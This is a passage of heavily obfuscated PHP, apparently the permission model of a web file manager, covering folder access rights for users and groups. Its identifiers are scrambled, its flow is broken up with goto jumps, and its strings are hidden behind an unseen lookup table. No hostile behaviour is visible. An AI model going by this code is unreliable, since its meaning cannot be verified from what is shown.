CÃ×ïµÛ’–; fÄ›ÕŠÅ‹: } public function setAuth($eèºËé•½Š, $fœÒÄ³î£¦) { goto b¸¬÷ñ¼±; aìÑèÑ³——: $this->where(array($FÆ“Œ•†¤Ë[383] => $eèºËé•½Š))->delete(); $this->addAll($A»ÓµÕ¡Ùî); return !0; goto fïƒ„‹Ñß¸; Bï«’› ß²: $béîå¦åÜ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $A»ÓµÕ¡Ùî = array(); foreach ($fœÒÄ³î£¦ as $E’¼ö³›Ö) { if (!in_array($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[371]], $béîå¦åÜ)) { show_json(LNG($FÆ“Œ•†¤Ë[2249]), !1); } if ($EÇ’´ŠëêŸ != $a«‘îÍë) { if ($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[371]] == SourceModel::TYPE_GROUP) { } if ($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[456]] != 0 && !in_array($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[456]], $Dƒ¼÷‘Ëë¾)) { } } if ($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[456]] == 0) { $E’¼ö³›Ö[$FÆ“Œ•†¤Ë[371]] = SourceModel::TYPE_USER; } $A»ÓµÕ¡Ùî[] = array($FÆ“Œ•†¤Ë[369] => $eèºËé•½Š, $FÆ“Œ•†¤Ë[371] => intval($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[371]]), $FÆ“Œ•†¤Ë[456] => intval($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[456]]), $FÆ“Œ•†¤Ë[2229] => intval($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[2229]]) ? intval($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[2229]]) : 0, $FÆ“Œ•†¤Ë[2230] => intval($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[2230]]) ? intval($E’¼ö³›Ö[$FÆ“Œ•†¤Ë[2230]]) : -1); } goto aìÑèÑ³——; aƒ¯ùğ·•: $a«‘îÍë = 1; $EÇ’´ŠëêŸ = $dÑ¨ˆôˆ’Ï[$FÆ“Œ•†¤Ë[456]]; if ($EÇ’´ŠëêŸ != $a«‘îÍë) { $c±Ü…§º©œ = array($FÆ“Œ•†¤Ë[2101] => $EÇ’´ŠëêŸ); $Dƒ¼÷‘Ëë¾ = Model($FÆ“Œ•†¤Ë[2175])->field($FÆ“Œ•†¤Ë[1434])->where($c±Ü…§º©œ)->select(); $Dƒ¼÷‘Ëë¾ = array_to_keyvalue($Dƒ¼÷‘Ëë¾, $FÆ“Œ•†¤Ë[33], $FÆ“Œ•†¤Ë[1434]); } goto Bï«’› ß²; b¸¬÷ñ¼±: $FÆ“Œ•†¤Ë =& $_SERVER[Æ]; $dÑ¨ˆôˆ’Ï = Model($FÆ“Œ•†¤Ë[1117])->sourceInfo($eèºËé•½Š); if ($dÑ¨ˆôˆ’Ï[$FÆ“Œ•†¤Ë[371]] != SourceModel::TYPE_GROUP) { return !1; } goto aƒ¯ùğ·•; fïƒ„‹Ñß¸: } public function authClear($Dí…šÈ†ïƒ) { $bº–ÙíŸºÊ =& $_SERVER[Æ]; $aÒ³²ŞŞ = Model($bº–ÙíŸºÊ[1117])->sourceInfo($Dí…šÈ†ïƒ); $Aí·¯œĞ = array($Dí…šÈ†ïƒ); if ($aÒ³²ŞŞ[$bº–ÙíŸºÊ[370]] == $bº–ÙíŸºÊ[83]) { $dØ’Ù¹Ü‚§ = array($bº–ÙíŸºÊ[525] => array($bº–ÙíŸºÊ[483], $aÒ³²ŞŞ[$bº–ÙíŸºÊ[459]] . $Dí…šÈ†ïƒ . $bº–ÙíŸºÊ[484])); $Aí·¯œĞ = Model($bº–ÙíŸºÊ[1117])->field($bº–ÙíŸºÊ[383])->where($dØ’Ù¹Ü‚§)->getField($bº–ÙíŸºÊ[369], !0); $Aí·¯œĞ[] = $Dí…šÈ†ïƒ; } $this->where(array($bº–ÙíŸºÊ[383] => array($bº–ÙíŸºÊ[384], $Aí·¯œĞ)))->delete(); return !0; } public function get($eƒ¶æïÑ“ä) { $dËóêç˜† = $this->getSourceList(array($eƒ¶æïÑ“ä), !0); return $dËóêç˜†[0]; } public function getSourceList($eà«—ÖÎÃŒ, $dí¡ŸªÙğ  = false) { goto Cåæãšğ; dËˆò²„ ë: $DÃ¦¨ô´Š‚ = array(); foreach ($dí¡ŸªÙğ  as $cŠíçˆ»¦Ñ => $a†íö›Ü¬) { $DÃ¦¨ô´Š‚[$cŠíçˆ»¦Ñ] = $this->makeSourceAuth($a†íö›Ü¬, $Cè‘„œİÇ); } return $DÃ¦¨ô´Š‚; goto D¾Úƒè¹İÑ; dæ¶´îãô—: $E©²Œ–˜ŸÂ = array($CÆ³›ò§¶[383] => array($CÆ³›ò§¶[384], $FÓÉï†Šàò)); $Cè‘„œİÇ = $this->field($aß¸°Î—‰)->where($E©²Œ–˜ŸÂ)->select(); $Cè‘„œİÇ = array_to_keyvalue_group($Cè‘„œİÇ, $CÆ³›ò§¶[369]); goto dËˆò²„ ë; E¨é¯…„´Ü: $FÓÉï†Šàò = array_values(array_unique($FÓÉï†Šàò)); if (!$FÓÉï†Šàò) { return array(); } $aß¸°Î—‰ = $CÆ³›ò§¶[2251]; goto dæ¶´îãô—; EÙÄêƒ¡ì‘: if (!$dí¡ŸªÙğ ) { $E©²Œ–˜ŸÂ = array($CÆ³›ò§¶[383] => array($CÆ³›ò§¶[384], $eà«—ÖÎÃŒ)); $dí¡ŸªÙğ  = $CÓƒ¥­Ìè->field($CÆ³›ò§¶[2250])->where($E©²Œ–˜ŸÂ)->select(); $dí¡ŸªÙğ  = array_to_keyvalue($dí¡ŸªÙğ , $CÆ³›ò§¶[369]); } $FÓÉï†Šàò = $eà«—ÖÎÃŒ; foreach ($dí¡ŸªÙğ  as $c™ÒÒ–Ğ => $D…‹ôŞ¼Ë¢) { $C¦ìÆÓÂèÈ = $CÓƒ¥­Ìè->parentLevelArray($D…‹ôŞ¼Ë¢[$CÆ³›ò§¶[459]]); $FÓÉï†Šàò = array_merge($FÓÉï†Šàò, $C¦ìÆÓÂèÈ, array($c™ÒÒ–Ğ)); } goto E¨é¯…„´Ü; Cåæãšğ: $CÆ³›ò§¶ =& $_SERVER[Æ]; if (!$eà«—ÖÎÃŒ) { return array(); } $CÓƒ¥­Ìè = Model($CÆ³›ò§¶[1117]); goto EÙÄêƒ¡ì‘; D¾Úƒè¹İÑ: } public function authDeepCheck($aæÓéµÜæ) { goto AêÓİÚçêæ; AêÓİÚçêæ: $DÔà·ˆ›‰Ã =& $_SERVER[Æ]; if (_get($GLOBALS, $DÔà·ˆ›‰Ã[457])) { return !1; } $béÃ—‰—‘ = $this->makeAuthDeep(); goto C…ƒË¿‰‡£; Cê×¦²ÛÄŸ: $E‚Ö·ÖˆÁŒ = $e¹È‹‰’¦ñ ? $e¹È‹‰’¦ñ[0] : $aæÓéµÜæ; return array($DÔà·ˆ›‰Ã[377] => -1, $DÔà·ˆ›‰Ã[418] => array($DÔà·ˆ›‰Ã[385] => $DÔà·ˆ›‰Ã[1031], $DÔà·ˆ›‰Ã[2107] => $DÔà·ˆ›‰Ã[468], $DÔà·ˆ›‰Ã[386] => LNG($DÔà·ˆ›‰Ã[2254]), $DÔà·ˆ›‰Ã[2119] => $DÔà·ˆ›‰Ã[2255]), $DÔà·ˆ›‰Ã[2256] => array($DÔà·ˆ›‰Ã[388] => $DÔà·ˆ›‰Ã[2257], $DÔà·ˆ›‰Ã[75] => $E‚Ö·ÖˆÁŒ)); goto A’Ûà¼«¦ã; C…ƒË¿‰‡£: if (!in_array($aæÓéµÜæ, $béÃ—‰—‘[$DÔà·ˆ›‰Ã[2252]])) { return !1; } $e¹È‹‰’¦ñ = array(); foreach ($béÃ—‰—‘[$DÔà·ˆ›‰Ã[2253]] as $a²‰†àÎÅ => $eÍÓëº¥Å) { if (!in_array($aæÓéµÜæ, $eÍÓëº¥Å)) { continue; } $e¹È‹‰’¦ñ[] = $a²‰†àÎÅ; } goto Cê×¦²ÛÄŸ; A’Ûà¼«¦ã: } protected function makeAuthDeep() { goto Bô­íÊ‰‘; D¢ˆĞ ‰Ø: if ($a„Ä§ï†î) { $bœ©¥—¢¯ = array(array($F’Ä¡‡[371] => SourceModel::TYPE_USER, $F’Ä¡‡[456] => USER_ID), array($F’Ä¡‡[371] => SourceModel::TYPE_GROUP, $F’Ä¡‡[456] => array($F’Ä¡‡[384], $a„Ä§ï†î)), $F’Ä¡‡[915] => $F’Ä¡‡[2181]); } if ($aƒÚßĞ¹å) { $bœ©¥—¢¯ = array($bœ©¥—¢¯, $F’Ä¡‡[2229] => array($F’Ä¡‡[2259], $aƒÚßĞ¹å)); } $AÜòĞ¦ = $this->field($F’Ä¡‡[2260])->where($bœ©¥—¢¯)->select(); goto Fâ„Òç¤é; e„Í†“Šã½: foreach ($eÙöÉ¹Õ as $dôù·õÜ¢) { $dÀ¬¯ªàÇ = $D«Òè¥Œ->getInfo($dôù·õÜ¢); $EñÑÏÔ“İ = $a›—ÍËÄï->parentLevelArray($dÀ¬¯ªàÇ[$F’Ä¡‡[459]]); $dŠëÂ¡¹×± = array_merge($dŠëÂ¡¹×±, $EñÑÏÔ“İ); } $dŠëÂ¡¹×± = array_values(array_unique($dŠëÂ¡¹×±)); foreach ($dŠëÂ¡¹×± as $dôù·õÜ¢) { $dÀ¬¯ªàÇ = $D«Òè¥Œ->getInfo($dôù·õÜ¢); $DË¾É¡[] = $dÀ¬¯ªàÇ[$F’Ä¡‡[391]][$F’Ä¡‡[369]]; $FğäÌö¢“ò[$dôù·õÜ¢] = $dÀ¬¯ªàÇ[$F’Ä¡‡[391]][$F’Ä¡‡[369]]; $aõÔİê°¯‰[$dôù·õÜ¢] = $a›—ÍËÄï->parentLevelArray($dÀ¬¯ªàÇ[$F’Ä¡‡[459]]); } goto C‹–õèøë¼; Fâ„Òç¤é: $bÆ×µßĞë‰ = array_to_keyvalue($AÜòĞ¦, $F’Ä¡‡[33], $F’Ä¡‡[369]); $DË¾É¡ = array(); $dŠëÂ¡¹×± = $a„Ä§ï†î; goto f„õ—ñïÇ; c³ç™œÈ«´: $aŸ–Ğ’Á± = array(); $FğäÌö¢“ò = array(); $aõÔİê°¯‰ = array(); goto D‰‘¶®ÖÖÁ; C‹–õèøë¼: foreach ($fºÛŸä¶’„ as $BˆïÒ¦Éäœ => $f¤œ¾ëä•‘) { $f°¢©³ïŞ = $aŸ–Ğ’Á±[$BˆïÒ¦Éäœ]; if (!$f°¢©³ïŞ || !$FğäÌö¢“ò[$f°¢©³ïŞ]) { continue; } $eõùæó‹„ã = array(); foreach ($aõÔİê°¯‰[$f°¢©³ïŞ] as $dôù·õÜ¢) { $eõùæó‹„ã[] = $FğäÌö¢“ò[$dôù·õÜ¢]; } $fºÛŸä¶’„[$BˆïÒ¦Éäœ] = array_merge($eõùæó‹„ã, $f¤œ¾ëä•‘); } $DË¾É¡ = array_values(array_unique($DË¾É¡)); $bŞòÒƒ¨ŒÂ = array($F’Ä¡‡[2252] => $DË¾É¡, $F’Ä¡‡[2253] => $fºÛŸä¶’„); goto BÚğÜÌÓÔ; f„õ—ñïÇ: $a›—ÍËÄï = Model($F’Ä¡‡[1117]); $D«Òè¥Œ = Model($F’Ä¡‡[458]); $fºÛŸä¶’„ = array(); goto c³ç™œÈ«´; c©Ê•™ÌÅ¸: $a„Ä§ï†î = Session::get($F’Ä¡‡[2213]); $a„Ä§ï†î = array_to_keyvalue($a„Ä§ï†î, $F’Ä¡‡[33], $F’Ä¡‡[2101]); $bœ©¥—¢¯ = array($F’Ä¡‡[371] => SourceModel::TYPE_USER, $F’Ä¡‡[456] => USER_ID); goto D¢ˆĞ ‰Ø; BÚğÜÌÓÔ: return $bŞòÒƒ¨ŒÂ; goto AĞˆÛšÏ–; C•Š¢Ï¶Ş¯: $D«âƒË•¯ = Model($F’Ä¡‡[2258])->listData(); $aƒÚßĞ¹å = array(); foreach ($D«âƒË•¯ as $cĞóå²çÀ) { if ($cĞóå²çÀ[$F’Ä¡‡[376]] == 0 && $cĞóå²çÀ[$F’Ä¡‡[2121]] == $F’Ä¡‡[83]) { $aƒÚßĞ¹å[] = $cĞóå²çÀ[$F’Ä¡‡[367]]; } } goto c©Ê•™ÌÅ¸; Bô­íÊ‰‘: $F’Ä¡‡ =& $_SERVER[Æ]; static $bŞòÒƒ¨ŒÂ = false; if ($bŞòÒƒ¨ŒÂ) { return $bŞòÒƒ¨ŒÂ; } goto C•Š¢Ï¶Ş¯; D‰‘¶®ÖÖÁ: if ($bÆ×µßĞë‰) { $CÁĞ ë¥ÛØ = $a›—ÍËÄï->where(array($F’Ä¡‡[369] => array($F’Ä¡‡[384], $bÆ×µßĞë‰)))->select(); foreach ($CÁĞ ë¥ÛØ as $e™çåíàÖÄ) { $EñÑÏÔ“İ = $a›—ÍËÄï->parentLevelArray($e™çåíàÖÄ[$F’Ä¡‡[459]]); $DË¾É¡ = array_merge($DË¾É¡, $EñÑÏÔ“İ); $dŠëÂ¡¹×±[] = $e™çåíàÖÄ[$F’Ä¡‡[456]]; $fºÛŸä¶’„[$e™çåíàÖÄ[$F’Ä¡‡[369]]] = $EñÑÏÔ“İ; $aŸ–Ğ’Á±[$e™çåíàÖÄ[$F’Ä¡‡[369]]] = $e™çåíàÖÄ[$F’Ä¡‡[456]]; } } $dŠëÂ¡¹×± = array_values(array_unique($dŠëÂ¡¹×±)); $eÙöÉ¹Õ = $dŠëÂ¡¹×±; goto e„Í†“Šã½; AĞˆÛšÏ–: } private function makeSourceAuth($F°ï¥Ï°½©, $f¿šš˜–ñØ) { goto B™»ƒº×¬³; BŒÃÃ¬ãÆ: if ($F°ï¥Ï°½©[$A²°²Ëë©[371]] == SourceModel::TYPE_GROUP) { $EÊ—¹½Á•“ = $F°ï¥Ï°½©[$A²°²Ëë©[456]]; if (isset($bëô°‘Ç®¾[$EÊ—¹½Á•“]) && !_get($GLOBALS, $A²°²Ëë©[457])) { $eš¹ˆÖ‡´µ = $bëô°‘Ç®¾[$EÊ—¹½Á•“]; if (Model($A²°²Ëë©[2248])->authCheckRoot($eš¹ˆÖ‡´µ[$A²°²Ëë©[376]][$A²°²Ëë©[376]])) { $fªµÕ¶ ×© = Model($A²°²Ëë©[458])->getInfo($EÊ—¹½Á•“); $E¤¥Îî¼İ = array($A²°²Ëë©[2261] => intval($eš¹ˆÖ‡´µ[$A²°²Ëë©[376]][$A²°²Ëë©[376]]), $A²°²Ëë©[2262] => $eš¹ˆÖ‡´µ[$A²°²Ëë©[376]], $A²°²Ëë©[2256] => array($A²°²Ëë©[388] => $A²°²Ëë©[2263], $A²°²Ëë©[2264] => $fªµÕ¶ ×©[$A²°²Ëë©[391]][$A²°²Ëë©[369]], $A²°²Ëë©[2265] => $fªµÕ¶ ×©[$A²°²Ëë©[463]])); return $E¤¥Îî¼İ; } } } $E¤¥Îî¼İ = !1; foreach ($FˆåÓ–à×´ as $D‡ñå÷®¬ã) { if (!isset($f¿šš˜–ñØ[$D‡ñå÷®¬ã])) { continue; } $DŸ¹’Ò“İ¬ = $this->authMake($f¿šš˜–ñØ[$D‡ñå÷®¬ã]); if ($DŸ¹’Ò“İ¬[$A²°²Ëë©[418]]) { $E¤¥Îî¼İ = $DŸ¹’Ò“İ¬; break; } } goto DÖğ‚òàƒÅ; EƒŒƒ¢¤Å: return $E¤¥Îî¼İ; goto E„ïÅâ²; B™»ƒº×¬³: $A²°²Ëë© =& $_SERVER[Æ]; $bëô°‘Ç®¾ = Session::get($A²°²Ëë©[2213]); $bëô°‘Ç®¾ = array_to_keyvalue($bëô°‘Ç®¾, $A²°²Ëë©[2101]); goto eÆ²ƒâˆ; DÖğ‚òàƒÅ: if (!$E¤¥Îî¼İ && $F°ï¥Ï°½©[$A²°²Ëë©[371]] == SourceModel::TYPE_GROUP) { $EÊ—¹½Á•“ = $F°ï¥Ï°½©[$A²°²Ëë©[456]]; if (isset($bëô°‘Ç®¾[$EÊ—¹½Á•“])) { $eš¹ˆÖ‡´µ = $bëô°‘Ç®¾[$EÊ—¹½Á•“]; $fªµÕ¶ ×© = Model($A²°²Ëë©[458])->getInfo($EÊ—¹½Á•“); $E¤¥Îî¼İ = array($A²°²Ëë©[2261] => intval($eš¹ˆÖ‡´µ[$A²°²Ëë©[376]][$A²°²Ëë©[376]]), $A²°²Ëë©[2262] => $eš¹ˆÖ‡´µ[$A²°²Ëë©[376]], $A²°²Ëë©[2256] => array($A²°²Ëë©[388] => $A²°²Ëë©[2266], $A²°²Ëë©[75] => $fªµÕ¶ ×©[$A²°²Ëë©[391]][$A²°²Ëë©[369]], $A²°²Ëë©[2265] => $fªµÕ¶ ×©[$A²°²Ëë©[463]])); return $E¤¥Îî¼İ; } } if (!$E¤¥Îî¼İ && $F°ï¥Ï°½©[$A²°²Ëë©[371]] == SourceModel::TYPE_GROUP) { $fªµÕ¶ ×© = Model($A²°²Ëë©[458])->getInfo($F°ï¥Ï°½©[$A²°²Ëë©[456]]); $CÎìÙöÙ¹® = explode($A²°²Ëë©[47], trim($fªµÕ¶ ×©[$A²°²Ëë©[459]], $A²°²Ëë©[47])); foreach ($CÎìÙöÙ¹® as $EÊ—¹½Á•“) { if ($EÊ—¹½Á•“ == $A²°²Ëë©[468] || $EÊ—¹½Á•“ == $fªîòÆóØŞ) { continue; } if (!isset($bëô°‘Ç®¾[$EÊ—¹½Á•“])) { continue; } $eš¹ˆÖ‡´µ = $bëô°‘Ç®¾[$EÊ—¹½Á•“]; $E¤¥Îî¼İ = array($A²°²Ëë©[2261] => intval($eš¹ˆÖ‡´µ[$A²°²Ëë©[376]][$A²°²Ëë©[376]]), $A²°²Ëë©[2262] => $eš¹ˆÖ‡´µ[$A²°²Ëë©[376]], $A²°²Ëë©[2256] => array($A²°²Ëë©[388] => $A²°²Ëë©[2263], $A²°²Ëë©[2264] => $fªµÕ¶ ×©[$A²°²Ëë©[391]][$A²°²Ëë©[369]], $A²°²Ëë©[2265] => $fªµÕ¶ ×©[$A²°²Ëë©[463]])); break; } } if ((!$E¤¥Îî¼İ || $E¤¥Îî¼İ[$A²°²Ëë©[377]] <= 0) && $F°ï¥Ï°½©[$A²°²Ëë©[371]] == SourceModel::TYPE_GROUP) { $fèŒµÎ—î = $this->authDeepCheck($F°ï¥Ï°½©[$A²°²Ëë©[369]]); if ($fèŒµÎ—î) { $E¤¥Îî¼İ = $fèŒµÎ—î; } } goto EƒŒƒ¢¤Å; eÆ²ƒâˆ: $fªîòÆóØŞ = $A²°²Ëë©[83]; $FˆåÓ–à×´ = Model($A²°²Ëë©[1117])->parentLevelArray($F°ï¥Ï°½©[$A²°²Ëë©[459]]); $FˆåÓ–à×´ = array_merge(array($F°ï¥Ï°½©[$A²°²Ëë©[369]]), array_reverse($FˆåÓ–à×´)); goto BŒÃÃ¬ãÆ; E„ïÅâ²: } public function authOwnerApply($c—ÄöâÜµ) { goto a¦¬‘æöë; aêº±Ä‹ê·: $E´Äœæ„† = array($BÊñÂ¦ßÈÉ[383] => array($BÊñÂ¦ßÈÉ[384], $BêÁ‘Ï çí)); $Aô§Ö„Œ÷Â = $this->field($BŠ˜ÓÅœ³Ç)->where($E´Äœæ„†)->select(); $Aô§Ö„Œ÷Â = array_to_keyvalue_group($Aô§Ö„Œ÷Â, $BÊñÂ¦ßÈÉ[369]); goto D’ƒå•¿‰¹; aÛ‹âñ‡´´: if (count($f‘£µˆ‹õ‚) == 0) { $f‘£µˆ‹õ‚ = $this->authFolderOwnerGroup($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[456]]); } $f‘£µˆ‹õ‚ = array_unique($f‘£µˆ‹õ‚); if (AuthModel::authCheckRoot($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[376]][$BÊñÂ¦ßÈÉ[377]])) { $f‘£µˆ‹õ‚[] = USER_ID; } goto B•½ì¸îÒ; a¦¬‘æöë: $BÊñÂ¦ßÈÉ =& $_SERVER[Æ]; if (empty($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[376]]) || isset($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[2267]]) && $c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[2267]]) { return $c—ÄöâÜµ; } if (AuthModel::authCheckRoot($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[376]][$BÊñÂ¦ßÈÉ[377]])) { return $c—ÄöâÜµ; } goto Fºª´×¥¢¯; Fºª´×¥¢¯: $BêÁ‘Ï çí = Model($BÊñÂ¦ßÈÉ[1117])->parentLevelArray($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[459]]); $BêÁ‘Ï çí = array_merge(array($c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[369]]), array_reverse($BêÁ‘Ï çí)); $BŠ˜ÓÅœ³Ç = $BÊñÂ¦ßÈÉ[2251]; goto aêº±Ä‹ê·; B•½ì¸îÒ: $c—ÄöâÜµ[$BÊñÂ¦ßÈÉ[376]][$BÊñÂ¦ßÈÉ[2269]] = Model($BÊñÂ¦ßÈÉ[474])->userListInfo($f‘£µˆ‹õ‚); return $c—ÄöâÜµ; goto céñ…æ…Úê; D’ƒå•¿‰¹: $b©™ªÀ³æ = array(); $f‘£µˆ‹õ‚ = array(); foreach ($Aô§Ö„Œ÷Â as $e‰ä‰ÜÁˆÔ => $AÀÄù–¹‰”) { $fóÁÕÔ¶Ã‹ = $this->authFolderOwnerUser($AÀÄù–¹‰”); $b©™ªÀ³æ[$e‰ä‰ÜÁˆÔ] = $fóÁÕÔ¶Ã‹; $f‘£µˆ‹õ‚ = array_merge($f‘£µˆ‹õ‚, $fóÁÕÔ¶Ã‹[$BÊñÂ¦ßÈÉ[535]]); if ($fóÁÕÔ¶Ã‹[$BÊñÂ¦ßÈÉ[2268]]) { break; } } goto aÛ‹âñ‡´´; céñ…æ…Úê: } private function authFolderOwnerGroup($AŞç£¿¡Ô) { $FÎÓ÷ŒéÄ =& $_SERVER[Æ]; $cÅê´ºâ§ƒ = Model($FÎÓ÷ŒéÄ[2175])->where(array($FÎÓ÷ŒéÄ[2101] => $AŞç£¿¡Ô))->select(); $añ¶ë ÷Ã = array(); if (!$cÅê´ºâ§ƒ) { return $añ¶ë ÷Ã; } foreach ($cÅê´ºâ§ƒ as $cóäô„ë¾æ) { $bÈíˆãÈª = $this->authInfo($cóäô„ë¾æ); if (AuthModel::authCheckRoot($bÈíˆãÈª[$FÎÓ÷ŒéÄ[376]])) { $añ¶ë ÷Ã[] = $cóäô„ë¾æ[$FÎÓ÷ŒéÄ[1434]]; } } return $añ¶ë ÷Ã; } private function authFolderOwnerUser($EĞˆÂóˆô³) { $Aôî¿µÓï =& $_SERVER[Æ]; $CÖß‚…é = array(); $E¨øÌˆáÀ = !1; foreach ($EĞˆÂóˆô³ as $A›÷áÖµ¡´) { $A±‰Ÿ„ßÀ = $this->authInfo($A›÷áÖµ¡´); if ($A›÷áÖµ¡´[$Aôî¿µÓï[456]] == $Aôî¿µÓï[468]) { $E¨øÌˆáÀ = !0; } if ($A›÷áÖµ¡´[$Aôî¿µÓï[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($A±‰Ÿ„ßÀ[$Aôî¿µÓï[376]])) { $CÖß‚…é[] = $A›÷áÖµ¡´[$Aôî¿µÓï[456]]; } } } return array($Aôî¿µÓï[535] => $CÖß‚…é, $Aôî¿µÓï[2268] => $E¨øÌˆáÀ); } public function authMake($f¨›÷ƒ·Å) { goto BØï™È°¥ñ; BØï™È°¥ñ: $C’Î¦œ±ó” =& $_SERVER[Æ]; if (!$f¨›÷ƒ·Å) { return array($C’Î¦œ±ó”[377] => 0, $C’Î¦œ±ó”[418] => !1); } $cö‰Ô‘ë® = Session::get($C’Î¦œ±ó”[2213]); goto B‚…Çêí”Ú; dˆ÷ó±ÔÍÌ: $A§‘ËÚ‘¼Ó = array($C’Î¦œ±ó”[2261] => intval($fÖå¿ˆÕæğ), $C’Î¦œ±ó”[2262] => $b¥–·áÃİª, $C’Î¦œ±ó”[2256] => array($C’Î¦œ±ó”[388] => $e–ñÑÖ«µà, $C’Î¦œ±ó”[75] => $C»¾Å¦èÆ£[$C’Î¦œ±ó”[369]])); return $A§‘ËÚ‘¼Ó; goto eôÅì†Ñ½£; d¼ì…ÈÌ¤§: $Aºğ¡•‘–¢ = 0; $C»¾Å¦èÆ£ = array($C’Î¦œ±ó”[369] => 0); foreach ($f¨›÷ƒ·Å as $C»¾Å¦èÆ£) { $b¥–·áÃİª = $this->authInfo($C»¾Å¦èÆ£); $F·âÑØË– = $C»¾Å¦èÆ£[$C’Î¦œ±ó”[456]]; $EÑãÍ‚‘ëæ = intval($b¥–·áÃİª[$C’Î¦œ±ó”[376]]); if ($C»¾Å¦èÆ£[$C’Î¦œ±ó”[371]] == SourceModel::TYPE_USER && $F·âÑØË– == USER_ID) { $Fô¤Ó“‘ğğ = !0; $DÂœù³› = $b¥–·áÃİª; $f°ÊÒñ¾”Œ = $EÑãÍ‚‘ëæ; } else { if ($C»¾Å¦èÆ£[$C’Î¦œ±ó”[371]] == SourceModel::TYPE_GROUP && in_array($F·âÑØË–, $FÓ³†öÔ‰)) { $aà¡ÏÙ“à = !0; if ($EÑãÍ‚‘ëæ >= $FóäÕöºÂ¯) { $FóäÕöºÂ¯ = $EÑãÍ‚‘ëæ; $AğÙø°©Ÿ¡ = $b¥–·áÃİª; } } else { if ($F·âÑØË– == $C’Î¦œ±ó”[468]) { $Aºğ¡•‘–¢ = !0; $Cí÷Ş¶¹åÅ = $b¥–·áÃİª; $c„ªìŸ¼ä = $EÑãÍ‚‘ëæ; } } } } goto bƒ¹ÆÁ‹Â; B‚…Çêí”Ú: $FÓ³†öÔ‰ = array_to_keyvalue($cö‰Ô‘ë®, $C’Î¦œ±ó”[33], $C’Î¦œ±ó”[2101]); $f°ÊÒñ¾”Œ = 0; $FóäÕöºÂ¯ = 0; goto DåÔôñÆé; E˜µŸŠ‡•ó: $Cí÷Ş¶¹åÅ = 0; $Fô¤Ó“‘ğğ = 0; $aà¡ÏÙ“à = 0; goto d¼ì…ÈÌ¤§; DåÔôñÆé: $c„ªìŸ¼ä = 0; $DÂœù³› = 0; $AğÙø°©Ÿ¡ = 0; goto E˜µŸŠ‡•ó; bƒ¹ÆÁ‹Â: $fÖå¿ˆÕæğ = $Fô¤Ó“‘ğğ ? $f°ÊÒñ¾”Œ : ($aà¡ÏÙ“à ? $FóäÕöºÂ¯ : $c„ªìŸ¼ä); $b¥–·áÃİª = $Fô¤Ó“‘ğğ ? $DÂœù³› : ($aà¡ÏÙ“à ? $AğÙø°©Ÿ¡ : $Cí÷Ş¶¹åÅ); $e–ñÑÖ«µà = $Fô¤Ó“‘ğğ ? $C’Î¦œ±ó”[2270] : ($aà¡ÏÙ“à ? $C’Î¦œ±ó”[2271] : ($Aºğ¡•‘–¢ ? $C’Î¦œ±ó”[2272] : $C’Î¦œ±ó”[361])); goto dˆ÷ó±ÔÍÌ; eôÅì†Ñ½£: } public function authTargetInfoMake($féÕÖğçëÑ) { goto a¸Ö½„ƒ¸; a¸Ö½„ƒ¸: $dÜ˜¢†íô‘ =& $_SERVER[Æ]; $AÈ¹µ­™­ç = array(); $AƒŠ„‡áùù = array(); goto aØ¿ƒÏî¦; aØ¿ƒÏî¦: foreach ($féÕÖğçëÑ as $FŒŠÈÚñ¡ ) { if ($FŒŠÈÚñ¡ [$dÜ˜¢†íô‘[371]] == SourceModel::TYPE_USER) { $AÈ¹µ­™­ç[] = intval($FŒŠÈÚñ¡ [$dÜ˜¢†íô‘[456]]); } else { if ($FŒŠÈÚñ¡ [$dÜ˜¢†íô‘[371]] == SourceModel::TYPE_GROUP) { $AƒŠ„‡áùù[] = intval($FŒŠÈÚñ¡ [$dÜ˜¢†íô‘[456]]); } } } if ($AÈ¹µ­™­ç) { $AÈ¹µ­™­ç = Model($dÜ˜¢†íô‘[474])->userListInfo($AÈ¹µ­™­ç); } if ($AƒŠ„‡áùù) { $A„°ğ“µ¸é = array($dÜ˜¢†íô‘[2173] => array($dÜ˜¢†íô‘[384], $AƒŠ„‡áùù)); $AƒŠ„‡áùù = Model($dÜ˜¢†íô‘[458])->field($dÜ˜¢†íô‘[2186])->where($A„°ğ“µ¸é)->select(); $AƒŠ„‡áùù = array_to_keyvalue($AƒŠ„‡áùù, $dÜ˜¢†íô‘[2101]); } goto BÅÙ«®ßÏ; BÅÙ«®ßÏ: return array($dÜ˜¢†íô‘[2273] => $AÈ¹µ­™­ç, $dÜ˜¢†íô‘[2265] => $AƒŠ„‡áùù); goto c‘ğô·¬ê; c‘ğô·¬ê: } private function authInfo($F›÷¼é¶²) { $aˆ»íØô÷Œ =& $_SERVER[Æ]; if ($F›÷¼é¶²[$aˆ»íØô÷Œ[2229]]) { $AğÊ¥äâ…® = Model($aˆ»íØô÷Œ[2248])->listData($F›÷¼é¶²[$aˆ»íØô÷Œ[2229]]); if (!$AğÊ¥äâ…®) { return !1; $D‹Í¤Ó‘‹ = Model($aˆ»íØô÷Œ[2248])->listData(); $B²×‚ˆ»íˆ = array_filter_by_field($D‹Í¤Ó‘‹, $aˆ»íØô÷Œ[376], $aˆ»íØô÷Œ[468]); return $B²×‚ˆ»íˆ; } $fèÄŞù‰¢ = array_field_key($AğÊ¥äâ…®, array($aˆ»íØô÷Œ[367], $aˆ»íØô÷Œ[28], $aˆ»íØô÷Œ[376], $aˆ»íØô÷Œ[2119], $aˆ»íØô÷Œ[2122])); $fèÄŞù‰¢[$aˆ»íØô÷Œ[2274]] = $F›÷¼é¶²; return $fèÄŞù‰¢; } else { return array($aˆ»íØô÷Œ[385] => 0, 